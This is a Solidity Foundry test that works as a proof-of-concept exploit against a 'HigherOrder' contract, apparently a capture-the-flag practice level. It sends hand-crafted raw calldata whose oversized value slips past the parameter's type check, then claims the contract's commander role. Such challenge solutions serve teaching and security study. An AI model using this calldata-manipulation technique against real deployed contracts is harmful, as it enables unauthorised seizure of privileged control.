// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;
import {Test, console} from "forge-std/Test.sol";
import {HigherOrder} from "src/HigherOrder.sol";

contract HigherOrder_POC is Test {
    HigherOrder _higherOrder;
    function init() private{
        vm.startPrank(address(0x10));
        _higherOrder = new HigherOrder();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_HigherOrder_POC() public{
        address(_higherOrder).call(hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100");
        _higherOrder.claimLeadership();
        console.log("Success: ", _higherOrder.commander()==address(this));
    }
        
}
